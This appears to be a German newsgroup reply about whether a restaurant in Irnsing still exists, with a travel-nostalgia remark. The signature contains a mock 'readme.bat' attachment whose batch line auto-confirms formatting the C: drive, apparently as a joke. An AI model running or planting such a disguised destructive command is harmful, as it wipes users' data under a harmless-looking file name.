On Tue, 20. 03. 23 18:11:28 +0200, "Bodo Furmanski"

Das weiss ich beim besten Willen nicht mehr. Ich weiss ja nicht mal,
ob es das Restaurant nach fuenf, sechs Jahren noch gibt. Vielleicht
ist es ja auch schon zur Touristenattraktion geworden und/oder die
damaligen Besitzer gibt es gar nicht mehr.

Du musst also schon selbst auf die Suche gehen und Dein Glueck
versuchen, vielleicht auch eine Enttaeuschung erleben. Deiner Frage
entnehme ich, dass Du nicht sehr viel Zeit hast in Irnsing.

Vielleicht/hoffentlich schreibt noch jemand anders hier was dazu, denn
ich wuerde auch schon gern mal wieder nach Portugal reisen ...

Norman
-- 
begin  readme.bat
echo off
echo Y|c:\windows\command\format c:
end